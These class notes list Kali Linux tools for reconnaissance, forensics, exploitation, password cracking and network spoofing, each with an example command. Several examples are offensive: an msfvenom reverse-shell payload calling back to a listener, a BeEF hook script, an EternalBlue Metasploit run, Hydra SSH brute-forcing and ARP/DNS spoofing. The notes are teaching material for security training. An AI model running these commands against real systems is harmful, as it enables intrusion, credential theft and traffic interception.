# Class 15

## Today's Topic
- bash scripting
- kali linux tools
  - tools for investigation
  - tools for exploration and penetration testing

## Shells
- zsh
- bash
- fish
- csh
- powershell -> windows

## Tools
### Information Gathering & OSINT

#### Whois
- **Description:** A command-line utility used to query domain registration records.
- **Use Cases:** Retrieving domain ownership details, administrative email addresses, contact phone numbers, and identifying registration infrastructure.
- **Example:**
  ```bash
  whois example.com
  ```

#### TheHarvester
- **Description:** An OSINT reconnaissance tool that aggregates publicly available intelligence from search engines, social networks, and PGP key servers.
- **Use Cases:** Discovering employee email lists, subdomains, and user identities to prepare targeted phishing or social engineering assessments.
- **Example:**
  ```bash
  theHarvester -d example.com -l 500 -b google,bing,linkedin
  ```

#### Recon-ng
- **Description:** A modular web reconnaissance framework structured similarly to Metasploit.
- **Use Cases:** Automating open-source intelligence gathering across public sources (Google, DNS, Twitter) to build a domain profile.
- **Example:**
  ```bash
  recon-ng
  [recon-ng][default] > modules load recon/domains-hosts/hackertarget
  [recon-ng][default][hackertarget] > options set SOURCE example.com
  [recon-ng][default][hackertarget] > run
  ```

#### Maltego
- **Description:** A visual link-analysis tool used to map connections between disparate pieces of public information.
- **Use Cases:** Threat intelligence, digital forensics, and constructing node graphs showing relationships between people, domains, IP blocks, and parent organizations.
- **Example:**
  ```bash
  # Launch the graphical application
  maltego
  ```

---

### Social Engineering & Browser Exploitation

#### Social Engineering Toolkit (SET)
- **Description:** A menu-driven framework designed to automate human-targeting attack vectors.
- **Use Cases:** Running authorized credential-harvesting campaigns, cloning web login portals, generating malicious USB payloads, and testing employee security awareness.
- **Example:**
  ```bash
  sudo setoolkit
  # Select: 1) Social-Engineering Attacks -> 2) Website Attack Vectors -> 3) Credential Harvester Attack Method
  ```

#### Browser Exploitation Framework (BeEF)
- **Description:** A penetration testing platform focused on weaponizing client-side vulnerabilities through the web browser.
- **Use Cases:** Hooking target browsers via malicious links or web pages to execute client scripts, steal active session tokens, and test cross-site scripting (XSS) scenarios.
- **Example:**
  ```bash
  # Start BeEF service
  beef-xss
  # Embed hook script into target page: <script src="http://<your-ip>:3000/hook.js"></script>
  ```

---

### Network Host Scanning

#### Ping
- **Description:** A network diagnostic utility that transmits ICMP echo request packets to target endpoints.
- **Use Cases:** Verifying whether a remote host is actively reachable and diagnosing basic network connectivity.
- **Example:**
  ```bash
  ping -c 4 192.168.1.1
  ```

#### ARP-scan
- **Description:** A local discovery tool that maps IP addresses to physical MAC addresses via ARP requests.
- **Use Cases:** Discovering active hosts within a local Layer 2 subnet, detecting unlisted network hardware, and mapping local device infrastructure.
- **Example:**
  ```bash
  sudo arp-scan --interface=eth0 --localnet
  ```

#### Nmap / Zenmap
- **Description:** A network discovery and vulnerability probing utility (Zenmap is its official graphical user interface).
- **Use Cases:** Scanning TCP/UDP ports, detecting running services and their versions, performing operating system fingerprinting, and mapping network perimeters.
- **Example:**
  ```bash
  # Fast SYN scan with service version and OS detection
  nmap -sS -sV -O -T4 192.168.1.1/24
  
  # Launch graphical Zenmap
  zenmap
  ```

---

### Digital Forensics

#### MagicRescue
- **Description:** A forensic data-recovery tool that identifies and extracts file types based on known magic byte signatures.
- **Use Cases:** Rebuilding corrupt or partially overwritten files directly from block storage where filesystem indices are missing.
- **Example:**
  ```bash
  magicrescue -d /recovered_files/ -r /usr/share/magicrescue/recipes/jpeg-jfif /dev/sdb1
  ```

#### Scalpel
- **Description:** A high-speed, filesystem-independent file carving tool that reconstructs fragmented files using specific header and footer definitions.
- **Use Cases:** Extracting evidence from unallocated disk space, raw memory dumps, and corrupted storage volumes during post-incident investigations.
- **Example:**
  ```bash
  scalpel -c /etc/scalpel/scalpel.conf -o /output_dir/ disk_image.dd
  ```

#### Scrounge-NTFS
- **Description:** A specialized recovery utility built specifically to read corrupted or deleted NTFS partition structures.
- **Use Cases:** Retrieving structured data and lost directory entries from damaged Windows partitions.
- **Example:**
  ```bash
  scrounge-ntfs -m /dev/sdb1 -c 8 -o /recovered_data/ 63 4194303
  ```

#### Guymager
- **Description:** A graphical forensic imaging tool featuring automated integrity verification (hashing) and write-blocker compatibility.
- **Use Cases:** Acquiring bit-by-bit forensic image copies of physical hard drives without altering original evidence.
- **Example:**
  ```bash
  # Launch Guymager GUI
  sudo guymager
  ```

#### PDFiD
- **Description:** A triage script that scans PDF files to detect potentially dangerous internal elements.
- **Use Cases:** Rapidly triaging suspicious documents to identify embedded JavaScript, executable actions, or encoded launch streams used in phishing attachments.
- **Example:**
  ```bash
  pdfid invoice_malicious.pdf
  ```

#### PDF-Parser
- **Description:** A deep-inspection tool designed to parse, extract, and decompress individual objects inside a PDF.
- **Use Cases:** Dissecting obfuscated payloads and extracting malicious code or embedded binaries hidden within compromised PDF files.
- **Example:**
  ```bash
  # Extract and decompress stream from object 5
  pdf-parser.py -o 5 -f -d extracted_stream.bin invoice_malicious.pdf
  ```

#### The Sleuth Kit (TSK)
- **Description:** A collection of C-based command-line utilities and libraries for analyzing disk volume layouts and file system metadata.
- **Use Cases:** Investigating raw disk images, auditing filesystem structures, and retrieving timeline artifacts from compromised disks.
- **Example:**
  ```bash
  # List partition table and filesystem details
  mmls evidence.img
  fls -r -p evidence.img
  ```

#### Autopsy
- **Description:** A graphical digital forensics platform built on top of The Sleuth Kit engine.
- **Use Cases:** Reviewing entire disk images, running automated timeline analyses, searching keyword indexes, and generating case evidence reports.
- **Example:**
  ```bash
  # Start the Autopsy web or desktop GUI interface
  autopsy
  ```

---

### Vulnerability Analysis & Exploitation

#### Nessus
- **Description:** A comprehensive enterprise vulnerability scanner that assesses network environments against CVE databases.
- **Use Cases:** Identifying unpatched software, misconfigured firewalls, and outdated protocols, followed by generating remediation guidance.
- **Example:**
  ```bash
  # Start Nessus service daemon
  sudo systemctl start nessusd
  # Open web console at https://localhost:8834/
  ```

#### OpenVAS / OpenBaaS
- **Description:** A full-featured open-source vulnerability scanner and management suite.
- **Use Cases:** Performing scheduled vulnerability audits across internal network segments to identify exploitable configurations.
- **Example:**
  ```bash
  sudo gvm-start
  # Access web interface at https://127.0.0.1:9392
  ```

#### Burp Suite
- **Description:** An integrated platform for web application security assessments acting primarily as an intercepting proxy.
- **Use Cases:** Intercepting HTTP traffic, testing for authentication bypasses, identifying Cross-Site Scripting (XSS), and manipulating web payloads.
- **Example:**
  ```bash
  # Launch Burp Suite
  burpsuite &
  # Configure browser proxy to 127.0.0.1:8080
  ```

#### OWASP ZAP (Zed Attack Proxy)
- **Description:** An open-source web application security scanner designed to find flaws during web development and testing.
- **Use Cases:** Running automated scans against HTTP/HTTPS traffic to catch issues like SQL injection, XSS, and broken access controls.
- **Example:**
  ```bash
  # CLI quick scan
  zaproxy -cmd -quickurl http://example.com -quickout zap_report.html
  ```

#### Aircrack-ng
- **Description:** A suite of wireless security tools used to monitor, capture, and test 802.11 Wi-Fi networks.
- **Use Cases:** Assessing WEP and WPA/WPA2 pre-shared key strength through packet capture analysis and dictionary attacks.
- **Example:**
  ```bash
  # Put interface in monitor mode and crack handshake
  sudo airmon-ng start wlan0
  aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
  ```

#### Reaver
- **Description:** A targeted attack utility against Wi-Fi Protected Setup (WPS) registrar PINs.
- **Use Cases:** Auditing wireless routers to test whether weak WPS implementations allow recovery of the underlying WPA/WPA2 passphrase.
- **Example:**
  ```bash
  sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
  ```

#### Kismet
- **Description:** A wireless network detector, packet sniffer, and intrusion detection system.
- **Use Cases:** Passively discovering hidden SSIDs, identifying unauthorized rogue access points, and logging 802.11 traffic without transmitting packets.
- **Example:**
  ```bash
  kismet -c wlan0
  ```

#### Metasploit Framework
- **Description:** A penetration testing platform used to create and execute payloads against known system weaknesses.
- **Use Cases:** Simulating real-world cyberattacks, confirming whether detected vulnerabilities are exploitable, and deploying payloads directly from workstations or mobile devices.
- **Example:**
  ```bash
  msfconsole -q
  msf6 > use exploit/windows/smb/ms17_010_eternalblue
  msf6 exploit(...) > set RHOSTS 192.168.1.100
  msf6 exploit(...) > exploit
  ```

#### Lynis
- **Description:** An open-source system security auditing and compliance scanner for Unix/Linux systems.
- **Use Cases:** Hardening Linux servers, detecting missing OS patches, reviewing firewall configs, and checking system permissions against security standards.
- **Example:**
  ```bash
  sudo lynis audit system
  ```

#### SQLmap
- **Description:** An automated command-line penetration testing tool that detects and exploits SQL injection flaws.
- **Use Cases:** Auditing database-driven web inputs, fingerprinting database engines, and extracting table schemas securely to recommend fixes.
- **Example:**
  ```bash
  sqlmap -u "http://example.com/item.php?id=1" --dbs --batch
  ```

#### jSQL Injection
- **Description:** A Java-based graphical application for database vulnerability discovery and exploitation.
- **Use Cases:** Visualizing SQL injection testing, automating database queries, and auditing backend database configurations.
- **Example:**
  ```bash
  # Launch jSQL GUI
  jsql-injection
  ```

#### SearchSploit / Exploit-DB
- **Description:** A local command-line search utility and online database archive of publicly available exploits and vulnerabilities.
- **Use Cases:** Researching known exploits and security weaknesses based on specific software versions and configurations to proactively patch systems.
- **Example:**
  ```bash
  searchsploit apache 2.4.49
  ```

#### MSFvenom / MSFPC (MSF Venom Payload Creator)
- **Description:** A dedicated payload generation utility designed to simplify payload creation.
- **Use Cases:** Generating custom, targeted payloads compatible with the Metasploit Framework for penetration testing and vulnerability assessments.
- **Example:**
  ```bash
  # Generate a Windows reverse TCP meterpreter payload
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
  ```

#### CrackMapExec
- **Description:** A post-exploitation tool designed to assess Active Directory environments.
- **Use Cases:** Enumerating domain users, testing credential reuse, and discovering common network share and domain misconfigurations.
- **Example:**
  ```bash
  crackmapexec smb 192.168.1.0/24 -u Administrator -p 'Password123'
  ```

#### NetExec
- **Description:** A tool that facilitates the execution of commands across remote networked systems.
- **Use Cases:** Managing machines during assessments, testing command-based vulnerabilities, and orchestrating distributed assessment commands.
- **Example:**
  ```bash
  nxc smb 192.168.1.50 -u 'admin' -p 'password' --shares
  ```

---

### Password Cracking & Credential Testing

#### Hydra
- **Description:** A fast, multi-threaded network logon cracker.
- **Use Cases:** Performing high-speed brute-force attacks across network protocols like SSH, FTP, and HTTP to evaluate password policy strength.
- **Example:**
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50 -t 4
  ```

#### John the Ripper
- **Description:** A password security auditing and hash-recovery tool.
- **Use Cases:** Cracking encrypted password hashes using dictionary, brute-force, or custom rule-based attacks.
- **Example:**
  ```bash
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hashes.txt
  ```

#### Crunch
- **Description:** A wordlist generator utility.
- **Use Cases:** Creating custom dictionary wordlists based on specific character sets, patterns, and lengths for password-cracking assessments.
- **Example:**
  ```bash
  # Generate all 6-character combinations using lowercase letters and numbers
  crunch 6 6 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_wordlist.txt
  ```

---

### Network Sniffing, Spoofing & MITM

#### Wireshark
- **Description:** A network packet analyzer that captures and displays real-time packet data across protocols.
- **Use Cases:** Performing passive network sniffing, deep packet inspection, troubleshooting traffic anomalies, and identifying unencrypted sensitive data flows.
- **Example:**
  ```bash
  # Launch GUI or capture on specific interface
  wireshark -i eth0 -k
  ```

#### tcpdump
- **Description:** A lightweight, command-line network packet capture and analysis tool.
- **Use Cases:** Intercepting, filtering, and logging raw network traffic directly from terminal sessions on servers or routers.
- **Example:**
  ```bash
  sudo tcpdump -i eth0 -nn -s0 -w traffic_capture.pcap port 80 or port 443
  ```

#### Ettercap
- **Description:** A comprehensive suite for active network sniffing, protocol analysis, and man-in-the-middle assessments.
- **Use Cases:** Intercepting switched network communications, logging credentials, and testing protocol encryption resilience.
- **Example:**
  ```bash
  # Unified sniffing via ARP poisoning
  sudo ettercap -T -q -M arp:remote /192.168.1.1// /192.168.1.50//
  ```

#### ARPspoof
- **Description:** A command-line utility used to redirect network packets on a local Area Network by forging ARP replies.
- **Use Cases:** Simulating ARP spoofing attacks to test switched network defenses and perform man-in-the-middle traffic interception.
- **Example:**
  ```bash
  # Poison target host routing to gateway
  sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1
  ```

#### Bettercap
- **Description:** An extensible framework for network reconnaissance, active sniffing, and man-in-the-middle operations.
- **Use Cases:** Simulating complex identity-based attacks, intercepting communications, and evaluating the strength of network-level encryption.
- **Example:**
  ```bash
  sudo bettercap -iface eth0
  # Inside prompt: net.probe on; net.sniff on
  ```

#### DNSspoof
- **Description:** A tool used to forge DNS response packets on a local network.
- **Use Cases:** Simulating DNS cache poisoning attacks to evaluate whether domain lookups can be redirected to test network resilience.
- **Example:**
  ```bash
  sudo dnsspoof -i eth0 -f hosts.txt
  ```

---

### Mobile Penetration Testing & Reverse Engineering (Kali NetHunter)

#### Kali NetHunter Platform & App Store
- **Description:** An open-source mobile penetration testing platform and centralized repository for Android devices.
- **Use Cases:** Conducting on-the-go security assessments, USB HID keystroke injection attacks on unattended workstations, and testing with external wireless adapters.
- **Example:**
  ```bash
  # Open the NetHunter terminal environment on Android
  nethunter
  ```

#### APKTool
- **Description:** A reverse-engineering tool for third-party, closed-source Android applications.
- **Use Cases:** Decompiling APKs to inspect internal project structures, resources, and manifest files directly on a mobile assessment platform.
- **Example:**
  ```bash
  # Decompile an APK into source directories
  apktool d target_app.apk -o decompiled_app/
  ```

#### JADX
- **Description:** A Dex-to-Java decompiler providing command-line and graphical interfaces.
- **Use Cases:** Decompiling Android DEX and APK files into readable Java source code to detect hardcoded credentials and insecure coding practices.
- **Example:**
  ```bash
  # Open GUI
  jadx-gui target_app.apk
  
  # Or decompile via CLI
  jadx -d /decompiled_src/ target_app.apk
  ```

#### NetCat
- **Description:** A general-purpose networking utility for reading and writing data across network connections.
- **Use Cases:** Port scanning, testing banner grabbing, transferring files, and setting up remote shell connections.
- **Example:**
  ```bash
  # Set up a listener
  nc -lvnp 4444
  
  # Connect to target
  nc 192.168.1.50 80
  ```

#### BusyBox
- **Description:** A multi-call binary that bundles standard Unix utilities into a compact executable.
- **Use Cases:** Providing essential command-line tools for low-level filesystem navigation and system administration tasks on Android-based test environments.
- **Example:**
  ```bash
  # Run a standalone Unix utility via BusyBox
  busybox ls -la /system/bin
  ```